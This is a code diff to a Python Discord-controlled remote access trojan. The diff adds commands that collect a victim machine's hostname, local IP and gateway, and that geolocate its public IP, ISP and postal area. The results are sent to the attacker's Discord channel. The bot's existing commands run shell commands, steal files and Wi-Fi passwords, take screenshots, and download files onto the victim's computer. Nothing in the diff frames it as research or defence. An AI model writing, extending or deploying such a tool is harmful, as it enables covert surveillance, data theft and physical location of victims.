@@ -13,7 +13,7 @@ import threading
 from tkinter import messagebox
 
 session = uuid.uuid4()
-TOKEN = "" 
+TOKEN = "" # <---- Discord Token
 
 current_dir = os.getcwd()
 intents = discord.Intents.default()
@@ -57,7 +57,7 @@ async def on_ready():
             f"Session: `{session}`\n"
             "--- Commands ---\n"
             "`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!chatsendmsg <text>`\n"
-            "`!stealfile <file>` | `!saveoncomputer <link>`"
+            "`!stealfile <file>` | `!saveoncomputer <link>` | `!stealpublicaddress` | `!stealwifiaddresses` "
         )
         await channel_ref.send(header)
     except Exception as e:
@@ -133,6 +133,50 @@ async def on_message(message):
         userip = socket.gethostbyname(socket.gethostname())
         threading.Thread(target=show_popup, args=(announcemsg,), daemon=True).start()
         await message.channel.send(f"✅ Pop-up sent to `{userip}`. Bot is still responsive.")
+    
+    elif message.content == "!stealwifiaddresses":
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+
+            
+            gateway = subprocess.check_output("powershell (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop", shell=True).decode().strip()
+
+            output = (
+                f"Hostname: {socket.gethostname()}\n"
+                f"IPv4 Address: {local_ip}\n"
+                f"Default Gateway: {gateway}"
+            )
+            await send_msg(message.channel, output)
+        except Exception as e:
+            await message.channel.send(f"Error: {e}")
+    
+
+    elif message.content == "!stealpublicaddress":
+        try:
+            #
+            response = requests.get('https://ipinfo.io/json', timeout=10)
+            data = response.json()
+            
+            #
+            ip = data.get('ip', 'N/A')
+            isp_response = requests.get(f'http://ip-api.com/json/{ip}?fields=isp', timeout=10).json()
+            isp = isp_response.get('isp', 'N/A')
+
+            address_info = (
+                f"🌐 Public IP Address: `{ip}`\n"
+                f"🏙️ City: `{data.get('city', 'N/A')}`\n"
+                f"🌍 Region: `{data.get('region', 'N/A')}`\n"
+                f"🚩 Country: `{data.get('country', 'N/A')}`\n"
+                f"🏢 ISP: `{isp}`\n"
+                f"📍 Location: `{data.get('loc', 'N/A')}`\n"
+                f"📮 Postal: `{data.get('postal', 'N/A')}`"
+            )
+            await message.channel.send(address_info)
+        except Exception as e:
+            await message.channel.send(f"❌ Error fetching public address: {e}")
 
     elif message.content.startswith("!cmd "):
         cmd = message.content[5:].strip()
